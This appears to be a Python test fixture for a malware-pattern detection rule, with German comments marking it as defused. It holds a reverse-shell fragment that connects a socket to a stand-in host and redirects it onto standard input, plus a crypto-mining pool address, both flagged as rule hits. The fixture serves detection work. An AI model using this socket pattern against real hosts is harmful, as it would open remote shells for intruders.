# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
import os
import socket

s = socket.socket()
s.connect(("gegenstelle.invalid", 4444))
# ruleid: LB-C10-schadmuster-py
os.dup2(s.fileno(), 0)
# ruleid: LB-C10-schadmuster-py
pool = "stratum+tcp://pool.invalid:3333"
# ok: LB-C10-schadmuster-py
os.dup2(logdatei.fileno(), 2)
# ok: LB-C10-schadmuster-py
server = "https://api.example"
